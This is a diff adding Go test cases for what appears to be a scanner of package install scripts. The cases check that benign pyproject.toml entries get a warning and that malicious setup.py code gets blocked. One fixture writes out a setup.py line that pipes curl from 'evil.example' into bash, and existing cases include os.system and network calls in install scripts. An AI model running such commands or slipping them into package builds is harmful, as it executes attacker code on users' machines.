@@ -20,6 +20,24 @@ func TestAnalyzeInstallScripts(t *testing.T) {
 		{"pypi setup exec+net", "pypi", map[string]string{"setup.py": "import os,urllib.request\nos.system('id')"}, verdict.LevelBlock},
 		{"pypi wheel-only sentinel", "pypi", map[string]string{}, verdict.LevelInfo},
 		{"crates build net+spawn", "crates", map[string]string{"build.rs": "use std::process::Command;\nlet _ = reqwest::blocking::get(\"http://x\");"}, verdict.LevelBlock},
+		{
+			"pypi tree-sitter-bash dependency is not a shell invocation",
+			"pypi",
+			map[string]string{"pyproject.toml": "[project]\ndependencies = [\n    \"tree-sitter-bash>=0.23,<0.27\",\n]\n"},
+			verdict.LevelWarn,
+		},
+		{
+			"pypi project.urls homepage is not a network call",
+			"pypi",
+			map[string]string{"pyproject.toml": "[project.urls]\nHomepage = \"https://github.com/example/example\"\nRepository = \"https://github.com/example/example\"\n"},
+			verdict.LevelWarn,
+		},
+		{
+			"pypi real curl-pipe-sh in setup.py still blocks",
+			"pypi",
+			map[string]string{"setup.py": "import os\nos.system('curl https://evil.example/x | bash')"},
+			verdict.LevelBlock,
+		},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
